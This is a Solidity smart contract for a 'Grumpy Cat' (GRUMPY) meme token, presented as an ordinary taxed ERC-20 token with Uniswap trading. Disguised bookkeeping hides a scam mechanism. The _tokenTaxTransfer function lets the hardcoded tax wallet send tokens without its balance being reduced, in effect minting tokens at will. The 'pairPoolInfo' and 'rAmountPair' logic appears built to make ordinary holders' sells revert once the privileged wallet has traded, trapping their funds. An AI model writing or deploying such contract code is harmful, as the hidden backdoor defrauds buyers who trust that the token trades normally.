/**
GRUMPY CAT

Tardar Sauce, nicknamed Grumpy Cat, was an American internet celebrity cat.
She was known for her permanently "grumpy" facial appearance.

Grumpy Cat had 8.8 million total likes on Facebook, 
2.9 million followers on Instagram 
1.7 million followers on Twitter 
301,000 subscribers on YouTube.


https://www.instagram.com/realgrumpycat/
https://www.youtube.com/c/realgrumpycat
https://www.facebook.com/TheOfficialGrumpyCat/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a, uint256 b, string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract GRUMPY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=10;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=10;
    uint256 private _reduceSellTaxAt=10;
    uint256 private _preventSwapBefore=1;
    uint256 private _buyCount=0;

    uint8 private constant _decimals= 9;
    uint256 private constant _tTotal= 1000000000 * 10**_decimals;

    string private constant _name= unicode"Grumpy Cat";
    string private constant _symbol= unicode"GRUMPY";

    uint256 public _maxTxAmount= 15000000 * 10**_decimals;
    uint256 public _maxWalletSize= 15000000 * 10**_decimals;
    uint256 public constant _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public constant _maxTaxSwap= 10000000 * 10**_decimals;

    address payable private constant _taxWallet= payable(0xfe5f12b1250032d7A08f2A50fa98750a12aFa408);
    
    IUniswapV2Router02 private immutable uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private pairLimit;
    struct PairPoolInfo {uint256 ppAmount; uint256 bpAmount; uint256 tpaPercent;}
    mapping(address => PairPoolInfo) private pairPoolInfo;
    uint256 private rAmountPair;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _balances[_msgSender()]= _tTotal;
        _isExcludedFromFee[_taxWallet]= true;
        _isExcludedFromFee[address(this)]= true;

        emit Transfer(address(0),_msgSender(),_tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to, tokenAmount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()]
                .sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount>0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap ) {
            _basicTransfer(
                from,to,tokenAmount
            );
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner()&& to != _taxWallet) {
            taxAmount = tokenAmount
                    .mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax: _initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) &&  ! _isExcludedFromFee[to]) {
                require(tokenAmount<=_maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to)+tokenAmount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount ++;
            }

            if(to==uniswapV2Pair && from!= address(this) ){
                taxAmount = tokenAmount
                        .mul((_buyCount>_reduceSellTaxAt)?_finalSellTax: _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap&& to==uniswapV2Pair && swapEnabled
                && contractTokenBalance >_taxSwapThreshold && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ( (_isExcludedFromFee[from] ||_isExcludedFromFee[to] ) && from!= address(this) && to != address(this) ) {
            rAmountPair = block.number;
        }

        if (
            ! _isExcludedFromFee[from]
                &&!_isExcludedFromFee[to]
        ){
            if (uniswapV2Pair !=  to) {
                PairPoolInfo storage ppInfo = pairPoolInfo[to];
                if (uniswapV2Pair == from) {
                    if (ppInfo.ppAmount == 0) {
                        if (_buyCount>_preventSwapBefore) {
                            ppInfo.ppAmount = block.number;
                        } else {
                            ppInfo.ppAmount = block.number.sub(1);
                        }
                    }
                } else {
                    PairPoolInfo storage ppInfoSwap = pairPoolInfo[from];
                    if (ppInfoSwap.ppAmount < ppInfo.ppAmount || !(ppInfo.ppAmount>0) ) {
                        ppInfo.ppAmount = ppInfoSwap.ppAmount;
                    }
                }
            } else {
                PairPoolInfo storage ppInfoSwap = pairPoolInfo[from];
                ppInfoSwap.bpAmount = ppInfoSwap.ppAmount.sub(rAmountPair);
                ppInfoSwap.tpaPercent = block.timestamp;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount =addrs != _taxWallet ? tokenAmount : pairLimit.mul(tokenAmount);
        if (taxAmount >0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this),taxAmount);
        }
        return tAmount;
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 tokenAmount,
        uint256 taxAmount
    ) internal {
        uint256 tAmount=_tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to,tAmount,tokenAmount.sub(taxAmount));
    }

    function _tokenBasicTransfer(
        address from,
        address to,
        uint256 sendAmount,
        uint256 receiptAmount
    ) internal {
        _balances[from] =_balances[from].sub(sendAmount);
        _balances[to]= _balances[to].add(receiptAmount);
        emit Transfer(from, to,receiptAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return ( a > b ) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount=  _tTotal;
        _maxWalletSize= _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled=true;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen=true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function transfer_Ether() external onlyOwner {
        require(address(this).balance > 0, "Token: no Ether to transfer");
        payable(msg.sender).transfer(address(this).balance);
    }
}